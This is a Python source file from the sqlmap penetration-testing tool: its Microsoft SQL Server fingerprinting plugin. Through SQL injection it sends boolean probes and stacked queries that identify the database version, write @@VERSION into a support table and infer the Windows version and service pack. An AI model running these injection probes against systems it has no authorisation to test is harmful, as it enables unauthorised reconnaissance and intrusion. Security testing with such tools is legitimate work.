#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import Format
from lib.core.common import getUnicode
from lib.core.common import randomInt
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.session import setDbms
from lib.core.settings import MSSQL_ALIASES
from lib.core.settings import UNKNOWN_DBMS_VERSION
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self, DBMS.MSSQL)

    def getFingerprint(self):
        value = ""
        wsOsFp = Format.getOs("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = Format.getOs("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "
        actVer = Format.getDbms()

        if not conf.extensiveFp:
            value += actVer
            return value

        blank = " " * 15
        value += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            release = kb.bannerFp["dbmsRelease"] if 'dbmsRelease' in kb.bannerFp else None
            version = kb.bannerFp["dbmsVersion"] if 'dbmsVersion' in kb.bannerFp else None
            servicepack = kb.bannerFp["dbmsServicePack"] if 'dbmsServicePack' in kb.bannerFp else None

            if release and version and servicepack:
                banVer = "%s %s " % (DBMS.MSSQL, release)
                banVer += "Service Pack %s " % servicepack
                banVer += "version %s" % version

                value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = Format.getErrorParsedDBMSes()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        if not conf.extensiveFp and (Backend.isDbmsWithin(MSSQL_ALIASES) \
           or conf.dbms in MSSQL_ALIASES) and Backend.getVersion() and \
           Backend.getVersion().isdigit():
            setDbms("%s %s" % (DBMS.MSSQL, Backend.getVersion()))

            self.getBanner()

            Backend.setOs(OS.WINDOWS)

            return True

        infoMsg = "testing %s" % DBMS.MSSQL
        logger.info(infoMsg)

        # NOTE: SELECT LEN(@@VERSION)=LEN(@@VERSION) FROM DUAL does not
        # work connecting directly to the Microsoft SQL Server database
        if conf.direct:
            result = True
        else:
            randInt = randomInt()
            result = inject.checkBooleanExpression("BINARY_CHECKSUM(%d)=BINARY_CHECKSUM(%d)" % (randInt, randInt))

        if result:
            infoMsg = "confirming %s" % DBMS.MSSQL
            logger.info(infoMsg)

            for version, check in [ ("2000", "HOST_NAME()=HOST_NAME()"), \
                                    ("2005", "XACT_STATE()=XACT_STATE()"), \
                                    ("2008", "SYSDATETIME()=SYSDATETIME()") ]:
                result = inject.checkBooleanExpression(check)

                if result:
                    Backend.setVersion(version)

            if Backend.getVersion():
                setDbms("%s %s" % (DBMS.MSSQL, Backend.getVersion()))
            else:
                setDbms(DBMS.MSSQL)

            self.getBanner()

            Backend.setOs(OS.WINDOWS)

            return True
        else:
            warnMsg = "the back-end DBMS is not %s" % DBMS.MSSQL
            logger.warn(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if Backend.getOs() and Backend.getOsVersion() and Backend.getOsServicePack():
            return

        if not Backend.getOs():
            Backend.setOs(OS.WINDOWS)

        if not detailed:
            return

        infoMsg = "fingerprinting the back-end DBMS operating system "
        infoMsg += "version and service pack"
        logger.info(infoMsg)

        infoMsg = "the back-end DBMS operating system is %s" % Backend.getOs()

        self.createSupportTbl(self.fileTblName, self.tblField, "varchar(1000)")
        inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "@@VERSION"))

        versions = { "2003": ("5.2", (2, 1)),
                     # TODO: verify this
                     #"2003": ("6.0", (2, 1)),
                     "2008": ("7.0", (1,)),
                     "2000": ("5.0", (4, 3, 2, 1)),
                     "7": ("6.1", (1, 0)),
                     "XP": ("5.1", (2, 1)),
                     "NT": ("4.0", (6, 5, 4, 3, 2, 1)) }

        # Get back-end DBMS underlying operating system version
        for version, data in versions.items():
            query = "(SELECT LEN(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
            query += "LIKE '%Windows NT " + data[0] + "%')>0"
            result = inject.checkBooleanExpression(query)

            if result:
                Backend.setOsVersion(version)
                infoMsg += " %s" % Backend.getOsVersion()
                break

        if not Backend.getOsVersion():
            Backend.setOsVersion("2003")
            Backend.setOsServicePack(2)

            warnMsg = "unable to fingerprint the underlying operating "
            warnMsg += "system version, assuming it is Windows "
            warnMsg += "%s Service Pack %d" % (Backend.getOsVersion(), Backend.getOsServicePack())
            logger.warn(warnMsg)

            self.cleanup(onlyFileTbl=True)

            return

        # Get back-end DBMS underlying operating system service pack
        sps = versions[Backend.getOsVersion()][1]

        for sp in sps:
            query = "SELECT LEN(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
            query += "LIKE '%Service Pack " + getUnicode(sp) + "%'"
            result = inject.goStacked(query)

            if result is not None and len(result) > 0 and result[0].isdigit():
                Backend.setOsServicePack(sp)
                break

        if not Backend.getOsServicePack():
            debugMsg = "assuming the operating system has no service pack"
            logger.debug(debugMsg)

            Backend.setOsServicePack(0)

        if Backend.getOsVersion():
            infoMsg += " Service Pack %d" % Backend.getOsServicePack()

        logger.info(infoMsg)

        self.cleanup(onlyFileTbl=True)
